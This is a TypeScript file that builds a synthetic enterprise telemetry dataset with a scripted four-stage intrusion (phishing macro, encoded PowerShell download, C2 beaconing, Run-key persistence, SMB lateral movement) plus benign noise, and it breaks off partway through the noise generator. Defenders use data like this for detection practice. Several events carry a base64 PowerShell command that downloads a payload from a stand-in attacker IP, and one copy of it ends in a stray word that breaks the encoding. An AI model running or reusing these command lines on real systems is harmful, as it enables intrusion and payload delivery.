import { NormalizedLogEvent } from '../types/telemetry';

/**
 * High-Fidelity Static Telemetry Dataset for "Operation Cobalt Drift"
 * Includes realistic enterprise baseline noise (~1,300+ events) and
 * the deterministic 4-stage adversary kill chain.
 */

// Adversary IOC constants
export const SCENARIO_IOCS = {
  VICTIM_HOST: 'WKSTN-CORP-014',
  VICTIM_IP: '10.0.4.14',
  VICTIM_USER: 'mjenkins',
  TARGET_HOST: 'FS-CORP-01',
  TARGET_IP: '10.0.1.5',
  DC_HOST: 'DC-CORP-01',
  DC_IP: '10.0.0.2',
  MALICIOUS_IP: '185.220.101.5',
  MALICIOUS_DOMAIN: 'update-telemetry-service.com',
  MALICIOUS_ATTACHMENT: 'Q1_Expense_Reconciliation.xlsm',
  MALICIOUS_DROPPED_FILE: 'C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe',
  MALICIOUS_DLL: 'C:\\Users\\mjenkins\\AppData\\Local\\Temp\\net_worker.dll',
  MALICIOUS_EXFIL_ARCHIVE: 'C:\\Shares\\Finance_Confidential\\archive_exfil.zip',
  PAYLOAD_SHA256: 'a93b2f56784d14b248a31e87498c5d2b7819f860183149e29a9972b22eef8531',
  DLL_SHA256: '5d41402abc4b2a76b9719d911017c592b49c8195a987ef1c06d884784a317e0a',
  POWERSHELL_PAYLOAD_CLI: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -encodedCommand JABjACAAPQAgACcAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAnADsAJABwACAAPQAgACcANAA0ADMAJwA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvACQAYwAvAHUAcABkAGEAdABlAC4AYgBpAG4AIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwAbQBqAGUAbgBrAGkAbgBzAFwAQQBwAHAA Raphael...',
};

// Seeded pseudorandom number generator for deterministic telemetry
function seededRandom(seed: number) {
  let s = seed % 2147483647;
  if (s <= 0) s += 2147483646;
  return () => {
    s = (s * 16807) % 2147483647;
    return (s - 1) / 2147483646;
  };
}

export function generateTelemetryDataset(): NormalizedLogEvent[] {
  const events: NormalizedLogEvent[] = [];
  const rand = seededRandom(1337);

  // Time base: 2025-03-15 starting at 08:30:00 UTC
  const baseTime = new Date('2025-03-15T08:30:00Z').getTime();
  let eventCounter = 1000;

  const nextId = () => `EVT-${eventCounter++}`;
  const formatTime = (msOffset: number) => new Date(baseTime + msOffset).toISOString();

  // Baseline corporate hosts and users
  const corporateUsers = [
    { username: 'sconnor', domain: 'CORP', hostname: 'WKSTN-CORP-002', ip: '10.0.4.2' },
    { username: 'dmiller', domain: 'CORP', hostname: 'WKSTN-CORP-008', ip: '10.0.4.8' },
    { username: 'mjenkins', domain: 'CORP', hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    { username: 'ewatson', domain: 'CORP', hostname: 'WKSTN-CORP-019', ip: '10.0.4.19' },
    { username: 'tchen', domain: 'CORP', hostname: 'WKSTN-CORP-022', ip: '10.0.4.22' },
    { username: 'svc_backup', domain: 'CORP', hostname: 'FS-CORP-01', ip: '10.0.1.5', is_admin: true },
    { username: 'SYSTEM', domain: 'NT AUTHORITY', hostname: 'DC-CORP-01', ip: '10.0.0.2', is_admin: true },
  ];

  // Helper to push an event
  const addEvent = (evt: NormalizedLogEvent) => {
    events.push(evt);
  };

  // --- ATTACK TELEMETRY: PHASE 1 (Initial Access & Execution) ---
  // 09:12:15 - Marcus Jenkins logs in interactively
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:12:15Z',
    event_source: 'security',
    event_id: 4624,
    event_category: 'authentication',
    severity: 'informational',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    raw_message: 'An account was successfully logged on. Logon Type: 2 (Interactive). User: CORP\\mjenkins. Workstation: WKSTN-CORP-014.',
  });

  // 09:14:02 - Outlook launches and opens attachment
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:14:02Z',
    event_source: 'sysmon',
    event_id: 1,
    event_category: 'process',
    severity: 'informational',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 3940,
      name: 'OUTLOOK.EXE',
      path: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
      command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"',
      parent_pid: 1488,
      parent_name: 'explorer.exe',
      parent_command_line: 'C:\\Windows\\Explorer.EXE',
    },
    raw_message: 'Process Create (Sysmon ID 1): OUTLOOK.EXE spawned by explorer.exe. PID: 3940. User: CORP\\mjenkins.',
  });

  // 09:15:33 - Excel opens Q1_Expense_Reconciliation.xlsm
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:15:33Z',
    event_source: 'sysmon',
    event_id: 1,
    event_category: 'process',
    severity: 'low',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 4820,
      name: 'EXCEL.EXE',
      path: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE',
      command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "C:\\Users\\mjenkins\\Downloads\\Q1_Expense_Reconciliation.xlsm"',
      parent_pid: 3940,
      parent_name: 'OUTLOOK.EXE',
      parent_command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"',
    },
    mitre: {
      tactic: 'Initial Access',
      technique_id: 'T1566.001',
      technique_name: 'Spearphishing Attachment',
    },
    raw_message: 'Process Create (Sysmon ID 1): EXCEL.EXE opened file "C:\\Users\\mjenkins\\Downloads\\Q1_Expense_Reconciliation.xlsm". PID: 4820.',
  });

  // 09:16:10 - MALICIOUS SPAWN: EXCEL.EXE executes cmd.exe
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:16:10Z',
    event_source: 'sysmon',
    event_id: 1,
    event_category: 'process',
    severity: 'high',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 4912,
      name: 'cmd.exe',
      path: 'C:\\Windows\\System32\\cmd.exe',
      command_line: 'cmd.exe /c "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -encodedCommand JABjACAAPQAgACcAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAnADsAJABwACAAPQAgACcANAA0ADMAJwA7AC4A"',
      parent_pid: 4820,
      parent_name: 'EXCEL.EXE',
      parent_command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "C:\\Users\\mjenkins\\Downloads\\Q1_Expense_Reconciliation.xlsm"',
    },
    mitre: {
      tactic: 'Execution',
      technique_id: 'T1204.002',
      technique_name: 'Malicious File / Macro Execution',
    },
    raw_message: 'Process Create (Sysmon ID 1): Suspicious child process cmd.exe spawned by Microsoft Office EXCEL.EXE (PID 4820).',
  });

  // 09:16:11 - EDR Alert for Office Child Process
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:16:11Z',
    event_source: 'edr_alert',
    event_id: 101,
    event_category: 'process',
    severity: 'high',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 4912,
      name: 'cmd.exe',
      path: 'C:\\Windows\\System32\\cmd.exe',
      command_line: 'cmd.exe /c "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -encodedCommand JABjACAAPQAgACcAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAnADsAJABwACAAPQAgACcANAA0ADMAJwA7AC4A"',
      parent_pid: 4820,
      parent_name: 'EXCEL.EXE',
    },
    mitre: {
      tactic: 'Execution',
      technique_id: 'T1059.001',
      technique_name: 'PowerShell Scripting',
    },
    raw_message: 'EDR Alert [HIGH]: Office Application spawned command shell. EXCEL.EXE (PID 4820) spawned cmd.exe with encoded arguments.',
  });

  // 09:16:12 - PowerShell Process Launched
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:16:12Z',
    event_source: 'sysmon',
    event_id: 1,
    event_category: 'process',
    severity: 'high',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 4988,
      name: 'powershell.exe',
      path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      command_line: SCENARIO_IOCS.POWERSHELL_PAYLOAD_CLI,
      parent_pid: 4912,
      parent_name: 'cmd.exe',
      parent_command_line: 'cmd.exe /c "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -encodedCommand JABjACAAPQAgACcAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAnADsAJABwACAAPQAgACcANAA0ADMAJwA7AC4A"',
      hashes: {
        sha256: '9f837782e2098651a37c3584ecfb3d1f11e649fc6165e31fa2e022f4b2383842',
      },
    },
    mitre: {
      tactic: 'Execution',
      technique_id: 'T1059.001',
      technique_name: 'PowerShell Execution',
    },
    raw_message: 'Process Create (Sysmon ID 1): powershell.exe launched with bypass flags and obfuscated base64 encoded command line.',
  });

  // --- ATTACK TELEMETRY: PHASE 2 (Defense Evasion & Dropper Staging) ---
  // 09:16:18 - PowerShell downloads payload from stage IP 185.220.101.5
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:16:18Z',
    event_source: 'sysmon',
    event_id: 3,
    event_category: 'network',
    severity: 'high',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 4988,
      name: 'powershell.exe',
      path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      command_line: SCENARIO_IOCS.POWERSHELL_PAYLOAD_CLI,
    },
    network: {
      protocol: 'http',
      src_ip: '10.0.4.14',
      src_port: 49210,
      dest_ip: '185.220.101.5',
      dest_port: 80,
      direction: 'outbound',
    },
    mitre: {
      tactic: 'Command and Control',
      technique_id: 'T1105',
      technique_name: 'Ingress Tool Transfer',
    },
    raw_message: 'Network Connection (Sysmon ID 3): powershell.exe (PID 4988) connected to 185.220.101.5:80 to download update.bin.',
  });

  // 09:16:21 - Dropper created in AppData\Local\Temp
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:16:21Z',
    event_source: 'sysmon',
    event_id: 11,
    event_category: 'file',
    severity: 'critical',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 4988,
      name: 'powershell.exe',
      path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      command_line: SCENARIO_IOCS.POWERSHELL_PAYLOAD_CLI,
    },
    file: {
      path: SCENARIO_IOCS.MALICIOUS_DROPPED_FILE,
      name: 'updater.exe',
      action: 'created',
      hashes: {
        sha256: SCENARIO_IOCS.PAYLOAD_SHA256,
      },
    },
    mitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1027',
      technique_name: 'Obfuscated Files or Information',
    },
    raw_message: `File Created (Sysmon ID 11): TargetFilename: C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe created by powershell.exe. SHA256: ${SCENARIO_IOCS.PAYLOAD_SHA256}.`,
  });

  // 09:16:23 - Helper DLL dropped in Temp
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:16:23Z',
    event_source: 'sysmon',
    event_id: 11,
    event_category: 'file',
    severity: 'high',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 4988,
      name: 'powershell.exe',
      path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      command_line: SCENARIO_IOCS.POWERSHELL_PAYLOAD_CLI,
    },
    file: {
      path: SCENARIO_IOCS.MALICIOUS_DLL,
      name: 'net_worker.dll',
      action: 'created',
      hashes: {
        sha256: SCENARIO_IOCS.DLL_SHA256,
      },
    },
    mitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1036.005',
      technique_name: 'Match Legitimate Name or Location',
    },
    raw_message: 'File Created (Sysmon ID 11): TargetFilename: C:\\Users\\mjenkins\\AppData\\Local\\Temp\\net_worker.dll created by powershell.exe.',
  });

  // 09:16:28 - Malicious updater.exe executed
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:16:28Z',
    event_source: 'sysmon',
    event_id: 1,
    event_category: 'process',
    severity: 'critical',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5124,
      name: 'updater.exe',
      path: SCENARIO_IOCS.MALICIOUS_DROPPED_FILE,
      command_line: '"C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe" --daemon --service=telemetry',
      parent_pid: 4988,
      parent_name: 'powershell.exe',
      parent_command_line: SCENARIO_IOCS.POWERSHELL_PAYLOAD_CLI,
      hashes: {
        sha256: SCENARIO_IOCS.PAYLOAD_SHA256,
      },
    },
    mitre: {
      tactic: 'Execution',
      technique_id: 'T1204.002',
      technique_name: 'User Execution: Malicious File',
    },
    raw_message: 'Process Create (Sysmon ID 1): updater.exe executed from Temp folder with arguments: --daemon --service=telemetry. PID: 5124.',
  });

  // 09:16:30 - updater.exe spawns rundll32.exe
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:16:30Z',
    event_source: 'sysmon',
    event_id: 1,
    event_category: 'process',
    severity: 'critical',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5210,
      name: 'rundll32.exe',
      path: 'C:\\Windows\\System32\\rundll32.exe',
      command_line: 'rundll32.exe "C:\\Users\\mjenkins\\AppData\\Local\\Temp\\net_worker.dll",DllRegisterServer',
      parent_pid: 5124,
      parent_name: 'updater.exe',
      parent_command_line: '"C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe" --daemon --service=telemetry',
    },
    mitre: {
      tactic: 'Defense Evasion',
      technique_id: 'T1218.011',
      technique_name: 'Rundll32 Execution',
    },
    raw_message: 'Process Create (Sysmon ID 1): rundll32.exe executed DLL from Temp path: net_worker.dll,DllRegisterServer. PID: 5210.',
  });

  // --- ATTACK TELEMETRY: PHASE 3 (Command & Control - C2 Beaconing) ---
  // 09:17:05 - DNS Query for malicious C2 domain
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:17:05Z',
    event_source: 'sysmon',
    event_id: 22,
    event_category: 'network',
    severity: 'medium',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    network: {
      protocol: 'dns',
      src_ip: '10.0.4.14',
      src_port: 53120,
      dest_ip: '10.0.0.2',
      dest_port: 53,
      dest_hostname: SCENARIO_IOCS.MALICIOUS_DOMAIN,
      direction: 'internal',
    },
    raw_message: `Dns query (Sysmon ID 22): QueryName: ${SCENARIO_IOCS.MALICIOUS_DOMAIN} resolved to ${SCENARIO_IOCS.MALICIOUS_IP} by PID 5124 (updater.exe).`,
  });

  // 09:17:15 - Periodic Beacon 1 to C2
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:17:15Z',
    event_source: 'sysmon',
    event_id: 3,
    event_category: 'network',
    severity: 'critical',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5124,
      name: 'updater.exe',
      path: SCENARIO_IOCS.MALICIOUS_DROPPED_FILE,
      command_line: '"C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe" --daemon --service=telemetry',
    },
    network: {
      protocol: 'tcp',
      src_ip: '10.0.4.14',
      src_port: 49450,
      dest_ip: SCENARIO_IOCS.MALICIOUS_IP,
      dest_port: 443,
      dest_hostname: SCENARIO_IOCS.MALICIOUS_DOMAIN,
      direction: 'outbound',
    },
    mitre: {
      tactic: 'Command and Control',
      technique_id: 'T1071.001',
      technique_name: 'Web Protocols (HTTPS C2)',
    },
    raw_message: `Network Connection (Sysmon ID 3): updater.exe (PID 5124) established TCP connection to ${SCENARIO_IOCS.MALICIOUS_IP}:443 [${SCENARIO_IOCS.MALICIOUS_DOMAIN}].`,
  });

  // 09:17:48 - Periodic Beacon 2
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:17:48Z',
    event_source: 'sysmon',
    event_id: 3,
    event_category: 'network',
    severity: 'high',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5124,
      name: 'updater.exe',
      path: SCENARIO_IOCS.MALICIOUS_DROPPED_FILE,
      command_line: '"C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe" --daemon --service=telemetry',
    },
    network: {
      protocol: 'tcp',
      src_ip: '10.0.4.14',
      src_port: 49488,
      dest_ip: SCENARIO_IOCS.MALICIOUS_IP,
      dest_port: 443,
      dest_hostname: SCENARIO_IOCS.MALICIOUS_DOMAIN,
      direction: 'outbound',
    },
    mitre: {
      tactic: 'Command and Control',
      technique_id: 'T1071.001',
      technique_name: 'Application Layer Protocol: Web',
    },
    raw_message: `Network Connection (Sysmon ID 3): updater.exe (PID 5124) periodic outbound sync to ${SCENARIO_IOCS.MALICIOUS_IP}:443 (Payload 512 bytes).`,
  });

  // 09:18:22 - Periodic Beacon 3
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:18:22Z',
    event_source: 'sysmon',
    event_id: 3,
    event_category: 'network',
    severity: 'high',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5124,
      name: 'updater.exe',
      path: SCENARIO_IOCS.MALICIOUS_DROPPED_FILE,
      command_line: '"C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe" --daemon --service=telemetry',
    },
    network: {
      protocol: 'tcp',
      src_ip: '10.0.4.14',
      src_port: 49512,
      dest_ip: SCENARIO_IOCS.MALICIOUS_IP,
      dest_port: 443,
      dest_hostname: SCENARIO_IOCS.MALICIOUS_DOMAIN,
      direction: 'outbound',
    },
    mitre: {
      tactic: 'Command and Control',
      technique_id: 'T1071.001',
      technique_name: 'Application Layer Protocol: Web',
    },
    raw_message: `Network Connection (Sysmon ID 3): updater.exe (PID 5124) periodic outbound sync to ${SCENARIO_IOCS.MALICIOUS_IP}:443 (Payload 1024 bytes).`,
  });

  // 09:18:35 - Persistence Established: Registry Run Key
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:18:35Z',
    event_source: 'sysmon',
    event_id: 13,
    event_category: 'process',
    severity: 'critical',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5124,
      name: 'updater.exe',
      path: SCENARIO_IOCS.MALICIOUS_DROPPED_FILE,
      command_line: '"C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe" --daemon --service=telemetry',
    },
    mitre: {
      tactic: 'Persistence',
      technique_id: 'T1547.001',
      technique_name: 'Registry Run Keys / Startup Folder',
    },
    raw_message: 'RegistryEvent (Value Set - Sysmon ID 13): TargetObject: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateTelemetry Details: C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe by updater.exe.',
  });

  // 09:19:02 - Firewall Alert
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:19:02Z',
    event_source: 'firewall',
    event_id: 2001,
    event_category: 'network',
    severity: 'high',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    network: {
      protocol: 'tcp',
      src_ip: '10.0.4.14',
      src_port: 49590,
      dest_ip: SCENARIO_IOCS.MALICIOUS_IP,
      dest_port: 443,
      direction: 'outbound',
    },
    raw_message: `PaloAlto NextGen FW: High risk threat signature 'CobaltStrike.Jitter.Beacon' detected from 10.0.4.14 to ${SCENARIO_IOCS.MALICIOUS_IP}:443.`,
  });

  // --- ATTACK TELEMETRY: PHASE 4 (Lateral Movement & Impact - Bonus Stage) ---
  // 09:22:10 - Reconnaissance on victim machine
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:22:10Z',
    event_source: 'sysmon',
    event_id: 1,
    event_category: 'process',
    severity: 'medium',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5890,
      name: 'whoami.exe',
      path: 'C:\\Windows\\System32\\whoami.exe',
      command_line: 'whoami /priv /groups',
      parent_pid: 5124,
      parent_name: 'updater.exe',
      parent_command_line: '"C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe" --daemon --service=telemetry',
    },
    mitre: {
      tactic: 'Discovery',
      technique_id: 'T1033',
      technique_name: 'System Owner/User Discovery',
    },
    raw_message: 'Process Create (Sysmon ID 1): updater.exe spawned whoami.exe /priv /groups for local privilege discovery.',
  });

  // 09:22:45 - Domain Trust and DC discovery
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:22:45Z',
    event_source: 'sysmon',
    event_id: 1,
    event_category: 'process',
    severity: 'medium',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5930,
      name: 'nltest.exe',
      path: 'C:\\Windows\\System32\\nltest.exe',
      command_line: 'nltest /dclist:CORP',
      parent_pid: 5124,
      parent_name: 'updater.exe',
    },
    mitre: {
      tactic: 'Discovery',
      technique_id: 'T1018',
      technique_name: 'Remote System Discovery',
    },
    raw_message: 'Process Create (Sysmon ID 1): nltest /dclist:CORP executed by updater.exe to enumerate corporate domain controllers.',
  });

  // 09:24:12 - Network SMB connection from WKSTN-CORP-014 to FS-CORP-01
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:24:12Z',
    event_source: 'sysmon',
    event_id: 3,
    event_category: 'network',
    severity: 'critical',
    host: { hostname: 'WKSTN-CORP-014', ip: '10.0.4.14' },
    user: { username: 'mjenkins', domain: 'CORP' },
    process: {
      pid: 5124,
      name: 'updater.exe',
      path: SCENARIO_IOCS.MALICIOUS_DROPPED_FILE,
      command_line: '"C:\\Users\\mjenkins\\AppData\\Local\\Temp\\updater.exe" --daemon --service=telemetry',
    },
    network: {
      protocol: 'tcp',
      src_ip: '10.0.4.14',
      src_port: 49812,
      dest_ip: '10.0.1.5',
      dest_port: 445,
      direction: 'internal',
    },
    mitre: {
      tactic: 'Lateral Movement',
      technique_id: 'T1021.002',
      technique_name: 'SMB/Windows Admin Shares',
    },
    raw_message: 'Network Connection (Sysmon ID 3): Outbound SMB connection to internal file server FS-CORP-01 (10.0.1.5:445) initiated by updater.exe.',
  });

  // 09:24:15 - Successful Network Logon on FS-CORP-01 (Event ID 4624 Type 3)
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:24:15Z',
    event_source: 'security',
    event_id: 4624,
    event_category: 'authentication',
    severity: 'critical',
    host: { hostname: 'FS-CORP-01', ip: '10.0.1.5' },
    user: { username: 'mjenkins', domain: 'CORP' },
    network: {
      protocol: 'tcp',
      src_ip: '10.0.4.14',
      src_port: 49812,
      dest_ip: '10.0.1.5',
      dest_port: 445,
      direction: 'inbound',
    },
    mitre: {
      tactic: 'Lateral Movement',
      technique_id: 'T1078.002',
      technique_name: 'Valid Accounts: Domain Accounts',
    },
    raw_message: 'An account was successfully logged on. Target: FS-CORP-01. Logon Type: 3 (Network). Source Workstation: WKSTN-CORP-014 (10.0.4.14). Account: CORP\\mjenkins.',
  });

  // 09:25:01 - Malicious service created on FS-CORP-01
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:25:01Z',
    event_source: 'security',
    event_id: 4697,
    event_category: 'process',
    severity: 'critical',
    host: { hostname: 'FS-CORP-01', ip: '10.0.1.5' },
    user: { username: 'SYSTEM', domain: 'NT AUTHORITY', is_admin: true },
    process: {
      pid: 684,
      name: 'services.exe',
      path: 'C:\\Windows\\System32\\services.exe',
      command_line: 'C:\\Windows\\System32\\services.exe',
    },
    mitre: {
      tactic: 'Persistence',
      technique_id: 'T1543.003',
      technique_name: 'Windows Service Creation',
    },
    raw_message: 'A service was installed in the system. Service Name: SvcHostNetworkManager. Service File Name: cmd.exe /c "powershell -enc JABz... C:\\Shares\\Finance_Confidential". Host: FS-CORP-01.',
  });

  // 09:26:14 - Exfiltration Archive Created on File Share
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:26:14Z',
    event_source: 'sysmon',
    event_id: 11,
    event_category: 'file',
    severity: 'critical',
    host: { hostname: 'FS-CORP-01', ip: '10.0.1.5' },
    user: { username: 'mjenkins', domain: 'CORP' },
    file: {
      path: SCENARIO_IOCS.MALICIOUS_EXFIL_ARCHIVE,
      name: 'archive_exfil.zip',
      action: 'created',
      hashes: {
        sha256: '7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069',
      },
    },
    mitre: {
      tactic: 'Collection',
      technique_id: 'T1560.001',
      technique_name: 'Archive via Utility',
    },
    raw_message: `File Created (Sysmon ID 11): TargetFilename: ${SCENARIO_IOCS.MALICIOUS_EXFIL_ARCHIVE} on share \\\\FS-CORP-01\\Finance_Confidential. Size: 48.2 MB.`,
  });

  // 09:26:30 - EDR Alert: Lateral Movement & Sensitive Share Access
  addEvent({
    id: nextId(),
    timestamp: '2025-03-15T09:26:30Z',
    event_source: 'edr_alert',
    event_id: 504,
    event_category: 'authentication',
    severity: 'critical',
    host: { hostname: 'FS-CORP-01', ip: '10.0.1.5' },
    user: { username: 'mjenkins', domain: 'CORP' },
    mitre: {
      tactic: 'Lateral Movement',
      technique_id: 'T1021.002',
      technique_name: 'SMB/Windows Admin Shares',
    },
    raw_message: 'EDR Alert [CRITICAL]: Lateral Movement detected from WKSTN-CORP-014 (10.0.4.14) to File Server FS-CORP-01. Suspicious bulk zip compression in restricted share.',
  });

  // --- BENIGN ENTERPRISE NOISE TELEMETRY (~1,300 events) ---
  const benignProcessList = [
    { name: 'chrome.exe', path: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', cmd: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer' },
    { name: 'slack.exe', path: 'C:\\Users\\{user}\\AppData\\Local\\slack\\slack.exe', cmd: '"C:\\Users\\{user}\\AppData\\Local\\slack\\slack.exe"' },
    { name: 'Teams.exe', path: 'C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe', cmd: '"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe" --process-start-args="--system-initiated"' },
    { name: 'svchost.exe', path: 'C:\\Windows\\System32\\svchost.exe', cmd: 'C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p' },
    { name: 'svchost.exe', path: 'C:\\Windows\\System32\\svchost.exe', cmd: 'C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p' },
    { name: 'conhost.exe', path: 'C:\\Windows\\System32\\conhost.exe', cmd: '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1' },
    { name: 'spoolsv.exe', path: 'C:\\Windows\\System32\\spoolsv.exe', cmd: 'C:\\Windows\\System32\\spoolsv.exe' },
    { name: 'OneDrive.exe', path: 'C:\\Users\\{user}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe', cmd: '"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background' },
    { name: 'MpSigStub.exe', path: 'C:\\Windows\\System32\\MpSigStub.exe', cmd: 'MpSigStub.exe /stub' },
    { name: 'git.exe', path: 'C:\\Program Files\\Git\\cmd\\git.exe', cmd: 'git.exe status --porcelain' },
    { name: 'code.exe', path: 'C:\\Users\\{user}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe', cmd: '"C:\\Users\\{user}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"' },
  ];

  const benignDomains = [
    { domain: 'clients4.google.com', ip: '142.250.190.46', port: 443 },
    { domain: 'teams.microsoft.com', ip: '52.114.159.39', port: 443 },
    { domain: 'slack-edge.com', ip: '13.249.99.112', port: 443 },
    { domain: 'login.microsoftonline.com', ip: '20.190.177.65', port: 443 },
    { domain: 'github.com', ip: '140.82.114.3', port: 443 },
    { domain: 'registry.npmjs.org', ip: '104.16.27.35', port: 443 },
    { domain: 'dc-corp-01.corp.internal', ip: '10.0.0.2', port: 88 },
    { domain: 'dc-corp-01.corp.internal', ip: '10.0.0.2', port: 389 },
    { domain: 'fs-corp-01.corp.internal', ip: '10.0.1.5', port: 445 },
  ];

  const benignFileNames = [
    'history-journal',
    'cookies.sqlite-wal',
    'lockfile',
    'package.json',
    'report_q1.xlsx',
    'meeting_notes.docx',
    'system_diagnostics.log',
    'slack-session.json',
    'AppxManifest.xml',
    'cache_data_003.bin',
  ];

  // Generate 1,320 benign events spread realistically across the 4-hour window (08:30 to 12:30)
  const totalBenign = 1320;
  for (let i = 0; i < totalBenign; i++) {
